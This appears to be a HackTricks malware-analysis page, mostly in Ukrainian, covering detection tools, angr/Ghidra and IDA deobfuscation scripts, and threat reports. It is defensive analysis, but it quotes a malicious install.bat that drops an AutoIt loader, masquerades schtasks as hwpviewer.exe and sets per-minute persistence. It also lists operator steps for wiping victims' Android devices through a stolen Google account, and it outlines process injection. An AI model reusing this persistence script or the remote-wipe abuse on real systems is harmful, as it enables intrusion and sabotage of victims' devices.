# Аналіз шкідливого ПЗ

{{#include ../../banners/hacktricks-training.md}}

## Шпаргалки з форензики

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Онлайн сервіси

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Офлайн антивірусні та засоби виявлення

### Yara

#### Встановлення
```bash
sudo apt-get install -y yara
```
#### Підготуйте правила

Використайте цей скрипт, щоб завантажити та об'єднати всі yara malware rules з github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Створіть директорію _**rules**_ та запустіть скрипт. Це створить файл під назвою _**malware_rules.yar**_, який містить усі yara rules для malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Сканування
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Перевірка на malware та створення правил

Ви можете використати інструмент [**YaraGen**](https://github.com/Neo23x0/yarGen) для генерації yara rules з binary. Ознайомтеся з цими підручниками: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Встановлення
```
sudo apt-get install -y clamav
```
#### Сканування
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** виявляє потенційно шкідливі **capabilities** у виконуваних файлах: PE, ELF, .NET. Тому воно знаходить такі речі, як Att\&ck tactics, або підозрілі можливості, наприклад:

- check for OutputDebugString error
- run as a service
- create process

Завантажити його з [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC означає Indicator Of Compromise. IOC — це набір **умов, що ідентифікують** деяке потенційно небажане програмне забезпечення або підтверджене **malware**. Blue Teams використовують такого роду визначення, щоб **шукати такі шкідливі файли** у своїх **системах** та **мережах**.\
Ділитися такими визначеннями дуже корисно: коли в комп'ютері виявлено **malware** і для нього створено IOC, інші Blue Teams можуть використати цей IOC, щоб швидше ідентифікувати **malware**.

Інструмент для створення або редагування IOC — [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Ви можете використовувати інструменти, такі як [**Redline**](https://www.fireeye.com/services/freeware/redline.html) щоб **шукати визначені IOCs на пристрої**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) є сканером для Simple Indicators of Compromise.\
Виявлення базується на чотирьох методах:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) — це сканер malware для Linux, випущений під ліцензією GNU GPLv2, який призначений для загроз у середовищах спільного хостингу. Він використовує дані про загрози з систем виявлення вторгнень на крайовому рівні мережі для вилучення malware, що активно використовується в атаках, і генерує сигнатури для виявлення. Крім того, дані про загрози також походять з користувацьких надсилань через функцію LMD checkout та ресурсів спільноти malware.

### rkhunter

Інструменти на кшталт [**rkhunter**](http://rkhunter.sourceforge.net) можна використовувати для перевірки файлової системи на можливі **rootkits** та malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) — інструмент, який намагається знайти obfuscated strings всередині executables, використовуючи різні методи.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)checks деякі базові речі всередині executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) — інструмент, який дозволяє отримати інформацію про Windows executables, такі як imports, exports, headers, а також перевіряє virus total і знаходить потенційні Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) — інструмент для визначення, чи є файл **encrypted**, а також для знаходження **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is Python-скриптом, який використовує різноманітні **statistical methods** для виявлення **obfuscated** та **encrypted** вмісту у текстових/скриптових файлах. Основна мета NeoPI — допомогти у **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) робить все можливе, щоб виявити **obfuscated**/**dodgy code** а також файли, що використовують **PHP** функції, часто застосовувані в **malwares**/webshells.

### Apple Binary Signatures

При перевірці деякого **malware sample** ви завжди повинні **check the signature** бінарного файлу, оскільки **developer**, який його підписав, може вже бути **related** до **malware**.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Техніки виявлення

### File Stacking

Якщо ви знаєте, що якась папка, яка містить **files** of a web server була **last updated on some date**, **перевірте** **date**, коли всі **files** in the **web server** були створені та змінені — якщо якась дата виглядає **підозрілою**, перевірте відповідний файл.

### Baselines

Якщо **files** папки **shouldn't have been modified**, ви можете обчислити **hash** оригінальних **files** папки і **compare** їх з поточними. Усе, що було змінено, буде **підозрілим**.

### Statistical Analysis

Коли інформація зберігається в **logs**, ви можете **check statistics** (наприклад, скільки разів кожен файл веб-сервера був звернений), оскільки web shell може бути одним із найбільш часто викликаних.

---

### Android in-app native telemetry (no root)

На Android ви можете інструментувати native код всередині процесу цільового додатка, предзавантаживши невелику logger бібліотеку перед ініціалізацією інших JNI libs. Це дає ранню видимість native поведінки без системних hooks або root. Популярний підхід — SoTap: додайте libsotap.so для потрібного ABI в APK і інжектуйте виклик System.loadLibrary("sotap") на ранньому етапі (наприклад, static initializer або Application.onCreate), потім збирайте логи з internal/external шляхів або використовуйте Logcat як fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Деяке Android malware і RASP-protected apps ховають JNI імена методів та сигнатури, декодуючи їх під час виконання перед викликом RegisterNatives. Коли Frida/ptrace інструментація вимкнена anti-debug, ви все одно можете відновити plaintext офлайн, виконавши in-binary декодер за допомогою angr і потім додавши результати як коментарі у Ghidra.

Ключова ідея: розглядати декодер всередині .so як callable function, виконати його над зашифрованими байт-блобами в .rodata і конкретизувати вихідні байти до першого \x00 (C-string terminator). Тримайте angr і Ghidra з однаковим image base, щоб уникнути невідповідностей адрес.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Налаштування angr та офлайн виконання декодера</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Масштабно побудуйте статичну мапу місць виклику до аргументів декодера (encoded_ptr, size). Обгортки можуть приховувати аргументи, тому ви можете створити цю мапу вручну з Ghidra xrefs, якщо відновлення API є шумним.

<details>
<summary>Пакетне декодування кількох точок виклику за допомогою angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Анотування точок виклику в Ghidra
Варіант A: Jython-only записувач коментарів (use a pre-computed JSON)
- Оскільки angr вимагає CPython3, тримайте deobfuscation та анотацію розділеними. Спочатку запустіть angr скрипт вище, щоб згенерувати decoded_strings.json. Потім запустіть цей Jython GhidraScript, щоб записати PRE_COMMENTs у кожній точці виклику (і включити ім'я функції-викликача для контексту):

<details>
<summary>Ghidra Jython скрипт для анотації декодованих JNI рядків</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: Single CPython script via pyhidra/ghidra_bridge
- Alternatively, use pyhidra or ghidra_bridge to drive Ghidra’s API from the same CPython process running angr. This allows calling decode_string() and immediately setting PRE_COMMENTs without an intermediate file. The logic mirrors the Jython script: build callsite→function map via ReferenceManager, decode with angr, and set comments.

Чому це працює і коли використовувати
- Offline execution sidesteps RASP/anti-debug: no ptrace, no Frida hooks required to recover strings.
- Keeping Ghidra and angr base_addr aligned (e.g., 0x00100000) ensures that function/data addresses match across tools.
- Repeatable recipe for decoders: treat the transform as a pure function, allocate an output buffer in a fresh state, call it with (encoded_ptr, out_ptr, len), then concretize via state.solver.eval and parse C-strings up to \x00.

Нотатки та підводні камені
- Respect the target ABI/calling convention. angr.factory.callable picks one based on arch; if arguments look shifted, specify cc explicitly.
- If the decoder expects zeroed output buffers, initialize outbuf with zeros in the state before the call.
- For position-independent Android .so, always supply base_addr so addresses in angr match those seen in Ghidra.
- Use currentProgram.getReferenceManager() to enumerate call-xrefs even if the app wraps the decoder behind thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Сучасні сімейства malware активно зловживають Control-Flow Graph (CFG) obfuscation: замість прямого jump/call вони обчислюють призначення під час виконання і виконують `jmp rax` або `call rax`. Маленький *dispatcher* (зазвичай дев'ять інструкцій) встановлює кінцеву ціль залежно від CPU `ZF`/`CF` прапорів, повністю ламаючи статичне відновлення CFG.

Техніку — продемонстровану завантажувачем SLOW#TEMPEST — можна подолати трьома кроками, які покладаються лише на IDAPython і Unicorn CPU emulator.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Витягніть байт-код диспетчера
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Емуляйте це двічі за допомогою Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Виконайте `run(code,0,0)` та `run(code,1,1)`, щоб отримати цілі переходів для хибної та істинної гілок.

### 4. Повернути прямий jump / call за допомогою патчу
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Після патчування змусьте IDA повторно проаналізувати функцію, щоб відновити повний CFG і вивід Hex-Rays:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Label indirect API calls

Після того як визначено реальне місце призначення кожного `call rax`, ви можете повідомити IDA про це, щоб типи параметрів і імена змінних відновлювалися автоматично:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Практичні переваги

* Відновлює реальний CFG → декомпіляція з *10* рядків зростає до тисяч.
* Дозволяє string-cross-reference & xrefs, роблячи відновлення поведінки тривіальним.
* Скрипти можна повторно використовувати: помістіть їх у будь-який loader, захищений тим самим трюком.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Цей вектор вторгнення поєднує підписаний MSI, AutoIt-завантажувачі, скомпільовані у .a3x, та завдання Task Scheduler, що маскується під легітимний додаток.

### MSI → кастомні дії → AutoIt оркестратор

Дерево процесів та команди, виконані кастомними діями MSI:

- MsiExec.exe → cmd.exe для запуску install.bat
- WScript.exe для показу відволікаючого діалогового вікна помилки
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, sets persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (приманка користувача):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Розміщує AutoIt3.exe та IoKlTr.au3 у C:\Users\Public\Music
- Копіює schtasks.exe у hwpviewer.exe (маскується під Hangul Word Processor viewer)
- Створює заплановане завдання "IoKlTr", яке виконується кожну 1 хвилину
- LNK у автозапуску: Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Розміщує модулі під %APPDATA%\Google\Browser\ у підтеках, що містять `adb` або `adv`, та запускає їх через допоміжні скрипти autoit.vbs/install.bat

Forensic triage tips:
- Перевірка schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Шукайте перейменовані копії schtasks.exe, що знаходяться поруч із Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Типові шляхи: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Корелюйте створення процесів: AutoIt3.exe spawning legitimate Windows binaries (e.g., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules are compiled with `#AutoIt3Wrapper_Outfile_type=a3x` і розшифровують вбудовані payloads перед injection у benign processes.
- Виявлені сімейства: QuasarRAT (injected into hncfinder.exe) та RftRAT/RFTServer (injected into cleanmgr.exe), а також модулі RemcosRAT (`Remcos\RunBinary.a3x`).
- Схема декодування: derive an AES key via HMAC, decrypt the embedded blob, then inject the plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Типовий потік ін'єкції (стиль CreateRemoteThread):
- CreateProcess (suspended) цільового хоста (наприклад, cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory з розшифрованим модулем/shellcode
- CreateRemoteThread або QueueUserAPC для виконання payload

Ідеї для виявлення
- AutoIt3.exe, запущений як дочірній процес від MsiExec.exe або WScript.exe, що порождає системні утиліти
- Файли з розширенням `.a3x` або AutoIt script runners у загальнодоступних/записуваних користувачем шляхах
- Підозрілі scheduled tasks, що виконують AutoIt3.exe або бінарники, не підписані Microsoft, з тригерами на рівні хвилин

### Зловживання при захопленні облікового запису через Android Find My Device (Find Hub)

Під час Windows-інфраструктурного вторгнення оператори використовували вкрадені Google облікові дані, щоб неодноразово очищати Android-пристрої жертви, пригнічуючи сповіщення, поки вони розширювали доступ через десктопний месенджер, в який жертва була залогінена.

Кроки оператора (із сесії браузера, де користувач вже залогінений):
- Переглянути Google Account → Security → Your devices; перейти до Find My Phone → Find Hub (https://www.google.com/android/find)
- Вибрати пристрій → повторно ввести Google password → виконати "Erase device" (factory reset); повторювати для затримки відновлення
- За бажанням: очистити alert e-mails у прив'язаній поштовій скриньці (наприклад, Naver), щоб приховати сповіщення безпеки

## Трасування сильно обфускованих завантажувачів Node.js

Атакувальники дедалі частіше пакують JavaScript loaders всередину standalone Windows бінарників, скомпільованих з допомогою [`nexe`](https://github.com/nexe/nexe), тож runtime постачається разом зі скриптом. Отриманий PE часто важить 60–90 MB і виконується навіть якщо Node.js не встановлений. Під час первинного аналізу:

- Використовуйте [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) щоб вирізати вбудований JavaScript з PE і передати його локальним інструментам для статичного diff-аналізу.
- Очікуйте mutex на диску в %TEMP% (GachiLoader кидає випадковий `<name>.lock` файл, який протухає приблизно через ~5 minutes). Копіювання файлу в sandbox перед виконанням дозволяє пропустити зайві стадії, при цьому все ще бачачи пізніші payload'и.

### Трасування Node.js API для обходу заходів протианалізу

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) підключає core modules всередині будь-якого Node.js процесу, дозволяє підробляти anti-VM probes і зберігає всі артефакти, які записує зразок. Запускайте обфусковані скрипти через Nodejs-Tracer, щоб інструментація, контрольована аналітиком, залишалася в стеку викликів:
```powershell
node -r .\tracer.js main.js
```
Ключові перемикачі конфігурації у `tracer.js` дозволяють вам:

- Log filesystem, child-process, and HTTP activity (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Every dropped file—such as `kidkadi.node`—is copied to the working directory before the malware deletes it.
- Підмінювати відбитки середовища, повертаючи реалістичні значення RAM/CPU, фальсифікуючи `tasklist` output і модифікуючи відповіді PowerShell/WMI. Це обходить loaders, які вимагають ≥4 GB RAM, ≥2 cores, і ретельно перевіряють user names (`mashinesssss`, `wdagutilityaccount`, etc.), hostnames (`desktop-vrsqlag`, `server1` …), and process names (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neuter WMI hardware checks like `Get-WmiObject Win32_DiskDrive` (looking for `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blocking “VirtualBox Graphics Adapter”, “Hyper-V Video”, etc.) and `Win32_PortConnector` counts. When those probes report “real” hardware, sandboxes no longer hit the infinite loop of benign `Invoke-WebRequest` calls to `linkedin.com`, `grok.com`, `whatsapp.com`, and similar domains that GachiLoader uses to waste analysis time.

### Автоматичне перехоплення gated C2 трафіку

Мережеві хуки tracer-а виявляють багаторівневу C2-аутентифікацію без реверсу JavaScript-обфускації. У спостереженій кампанії loader:

1. POSTs host telemetry to `/log` on each hard-coded C2.
2. Issues `GET /richfamily/<per-sample key>` with `X-Secret: gachifamily` to retrieve a Base64-encoded payload URL.
3. Performs a final `GET` to that URL with a long per-sample `X-Secret` header; missing it returns `403 Forbidden`.

Оскільки tracer записує повні запити (headers, bodies, destinations), ви можете replay the same traffic щоб pull payloads, dump Themida/VMProtect shells in memory, and extract Rhadamanthys configuration data at scale.

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
